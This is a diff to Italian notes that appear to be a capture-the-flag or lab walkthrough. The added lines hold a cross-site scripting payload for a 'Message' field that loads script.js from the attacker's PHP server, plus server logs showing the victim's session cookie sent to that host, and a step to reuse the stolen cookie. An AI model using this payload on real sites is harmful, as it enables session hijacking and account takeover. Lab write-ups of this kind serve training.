@@ -763,8 +763,25 @@ sudo php -S 0.0.0.0:80
 
 incolla nel campo Message
 
-"><script>src=http://10.10.15.1/script.js></script>
+"><script src="http://10.10.14.111/script.js"></script>
 
+```
+sudo php -S 0.0.0.0:80
+[Mon Nov  9 14:20:31 2026] PHP 8.4.27 Development Server (http://0.0.0.0:80) started
+[Mon Nov  9 14:25:19 2026] 10.129.41.101:32818 Accepted
+[Mon Nov  9 14:25:19 2026] 10.129.41.101:32818 [200]: GET /script.js
+[Mon Nov  9 14:25:19 2026] 10.129.41.101:32818 Closing
+[Mon Nov  9 14:25:19 2026] 10.129.41.101:32820 Accepted
+[Mon Nov  9 14:25:19 2026] 10.129.41.101:32820 [200]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99
+[Mon Nov  9 14:25:19 2026] 10.129.41.101:32820 Closing
+[Mon Nov  9 14:25:21 2026] 10.129.41.101:32842 Accepted
+[Mon Nov  9 14:25:21 2026] 10.129.41.101:32842 [200]: GET /script.js
+[Mon Nov  9 14:25:21 2026] 10.129.41.101:32842 Closing
+[Mon Nov  9 14:25:21 2026] 10.129.41.101:32844 Accepted
+[Mon Nov  9 14:25:21 2026] 10.129.41.101:32844 [200]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99
+[Mon Nov  9 14:25:21 2026] 10.129.41.101:32844 Closing
+^C                                                                         
+```
 
 metti il cookie con cookie editor 
 
